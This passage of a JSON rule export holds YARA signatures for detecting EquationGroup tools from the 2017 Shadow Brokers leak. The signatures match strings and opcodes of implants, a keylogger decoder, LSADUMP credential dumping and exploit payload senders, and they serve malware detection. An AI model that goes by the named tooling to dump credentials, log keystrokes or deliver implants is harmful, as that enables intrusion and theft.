Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_PC_Level3_http_exe_RID38D3","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"84847a051c02ae52697ea0625157af2a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_ParseCapture_RID36C5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Encrypted log found.  An encryption key must be provided\" fullword ascii\n      $x2 = \"encryptionkey = e.g., \\\"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\\\"\" fullword ascii\n      $x3 = \"Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )\n}","date":"2017-04-15 17:10:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_ParseCapture_RID36C5","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"d16137f74862ae0220ad505ebc51e1be","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_ActiveDirectory_Target_RID3ACD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n      $s2 = \"(&(objectClass=user)(objectCategory=person)\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-15 20:02:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_ActiveDirectory_Target_RID3ACD","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b7356077f4eeddc1c3844d7683bdf469","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_PC_Legacy_dll_RID36D8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 } \n      $op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 } \n      $op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-15 17:13:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_PC_Legacy_dll_RID36D8","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"5d8e944d2992831ebc44ae2a4dc7b67e","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_svctouch_RID3565 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:11:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Causes: Firewall,Machine down,DCOM disabled\\\\not supported,etc.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )\n}","date":"2017-04-15 16:11:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_svctouch_RID3565","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"567618e015415d759aae51d26b450875","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_pwd_Implant_RID3675 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"7\\\"7(7/7>7O7]7o7w7\" fullword ascii\n      $op1 = { 40 50 89 44 24 18 FF 15 34 20 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )\n}","date":"2017-04-15 16:56:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_pwd_Implant_RID3675","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"221b93c5d228c3a7592c398120b805c1","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_KisuComms_Target_2000_RID3978 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"363<3S3c3l3q3v3{3\" fullword ascii\n      $s2 = \"3!3%3)3-3135393@5\" fullword ascii\n      $op0 = { eb 03 89 46 54 47 83 ff 1a 0f 8c 40 ff ff ff 8b } \n      $op1 = { 8b 46 04 85 c0 74 0f 50 e8 34 fb ff ff 83 66 04 } \n      $op2 = { c6 45 fc 02 8d 8d 44 ff ff ff e8 d2 2f 00 00 eb } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or all of ( $op* ) ) )\n}","date":"2017-04-15 19:05:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_KisuComms_Target_2000_RID3978","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b015209967f7d7ae3077ca810d5dc016","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_SlDecoder_RID356B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error in conversion. SlDecoder.exe <input filename> <output filename> at command line \" fullword wide\n      $x2 = \"KeyLogger_Data\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 16:12:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_SlDecoder_RID356B","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"8c92eda0dc3a7a4f6cc274cd2af70d08","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Windows_Implant_RID3815 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:06:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"0#0)0/050;0M0Y0h0|0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}","date":"2017-04-15 18:06:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Windows_Implant_RID3815","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"1178f632d2c6d8f82dbadcd590dd6ce7","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld_RID3C05 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PQRAPAQSTUVWARASATAUAVAW\" fullword ascii\n      $s2 = \"SQRUWVAWAVAUATASARAQAP\" fullword ascii\n      $s3 = \"iijymqp\" fullword ascii\n      $s4 = \"AWAVAUATASARAQI\" fullword ascii\n      $s5 = \"WARASATAUAVM\" fullword ascii\n      $op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc } \n      $op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 } \n      $op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of ( $s* ) or all of ( $op* ) )\n}","date":"2017-04-15 20:54:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld_RID3C05","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"4dd2318780233dcbbc581c7c22f61cce","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_SetCallback_RID362F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"*NOTE: This version of SetCallback does not work with PeddleCheap versions prior\" fullword ascii\n      $s3 = \"USAGE: SetCallback <input file> <output file>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-04-15 16:45:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_SetCallback_RID362F","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"5cc99f9bdfbd95d664aba8793575aa3a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0_RID4237 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 01:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DFReader.exe logfile AESKey [-j] [-o outputfilename]\" fullword ascii\n      $x2 = \"Double Feature Target Version\" fullword ascii\n      $x3 = \"DoubleFeature Process ID\" fullword ascii\n      $op1 = { a1 30 21 41 00 89 85 d8 fc ff ff a1 34 21 41 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( 2 of them )\n}","date":"2017-04-15 01:18:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0_RID4237","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"ba22f86f5178e2050519325aaa551931","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__vtuner_vtuner_1_RID388C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:25:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unable to get -w hash.  %x\" fullword wide\n      $s2 = \"!\\\"invalid instruction mnemonic constant Id3vil\\\"\" fullword wide\n      $s4 = \"Unable to set -w provider. %x\" fullword wide\n      $op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 } \n      $op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )\n}","date":"2017-04-15 18:25:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__vtuner_vtuner_1_RID388C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b0dae39138eca8d21cfa93cf9ca86143","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2_RID391D : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Target is share name\" fullword ascii\n      $s2 = \"Could not make UdpNetbios header -- bailing\" fullword ascii\n      $s3 = \"Request non-NT session key\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-15 18:50:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2_RID391D","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"15087343cbc48daf3a85154a22f05f05","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4_RID3A9F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:54:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Listening Post DLL %s() returned error code %d.\" fullword ascii\n      $s1 = \"WsaErrorTooManyProcesses\" fullword ascii\n      $s2 = \"NtErrorMoreProcessingRequired\" fullword ascii\n      $s3 = \"Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n      $s4 = \"ServerErrorBadNamePassword\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of ( $s* ) or 1 of ( $x* ) )\n}","date":"2017-04-15 19:54:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4_RID3A9F","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"0bbd0cbe1e7c57baf3a2d57da1aea25d","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6_RID3D29 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 21:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"* Failed to connect to destination - %u\" fullword wide\n      $s6 = \"* Failed to convert destination address into sockaddr_storage values\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}","date":"2017-04-15 21:42:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6_RID3D29","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"05c62adbbcf90da8e53317889129d85f","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__AddResource_RID36A6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s cm 10 2000 \\\"c:\\\\MY DIR\\\\myapp.exe\\\" c:\\\\MyResourceData.dat\" fullword ascii\n      $s2 = \"<PE path> - the path to the PE binary to which to add the resource.\" fullword ascii\n      $s3 = \"Unable to get path for target binary.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )\n}","date":"2017-04-15 17:04:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__AddResource_RID36A6","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"abfbf765bb3dac99f5bb81d0baf57491","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ESKE_RPC2_8_RID358A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:17:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"Fragment: Packet too small to contain RPC header\" fullword ascii\n      $s5 = \"Fragment pickup: SmbNtReadX failed\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them )\n}","date":"2017-04-15 16:17:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ESKE_RPC2_8_RID358A","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"7f48440dd35d534f09eef2676d7aadc2","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9_RID53B6 : APT DEMO EXE FILE T1047 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 09:10:30\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Injection Lib -  \" wide\n      $x2 = \"LSADUMP - - ERROR\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-04-15 09:10:30","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9_RID53B6","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"199bfc46ffcde4d131c89c4eaf7aad43","score":75,"tags":["APT","DEMO","EXE","T1047","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ETBL_ETRE_10_RID35CB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Probe #2 usage: %s -i TargetIp -p TargetPort -r %d [-o TimeOut] -t Protocol -n IMailUserName -a IMailPassword\" fullword ascii\n      $x6 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER : 0x%08X\" fullword ascii\n      $s19 = \"Sending Implant Payload.. cEncImplantPayload size(%d)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 16:28:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ETBL_ETRE_10_RID35CB","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"ed72136f0914236cee8619a902bd24ae","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11_RID3A2B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Target is vulnerable\" fullword ascii\n      $x2 = \"Target is NOT vulnerable\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}","date":"2017-04-15 19:35:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11_RID3A2B","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"c63aae2e1dc378552613280c5b2f6e16","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12_RID3AA5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:55:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"** CreatePayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-15 19:55:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12_RID3AA5","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b896d925bd79e724281bac78b4f8620e","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__ELV_ESKE_13_RID3586 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored.\" fullword ascii\n      $s2 = \"ERROR: pGvars->pIntRideAreaImplantPayload is NULL\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )\n}","date":"2017-04-15 16:16:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__ELV_ESKE_13_RID3586","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"4d397415f6327dd1b84896994fc65127","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14_RID3956 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DEC Pathworks TCPIP service on Windows NT\" fullword ascii\n      $s2 = \"<\\\\\\\\__MSBROWSE__> G\" fullword ascii\n      $s3 = \"<IRISNAMESERVER>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-15 18:59:31","description":"Detects EquationGroup Tool - April 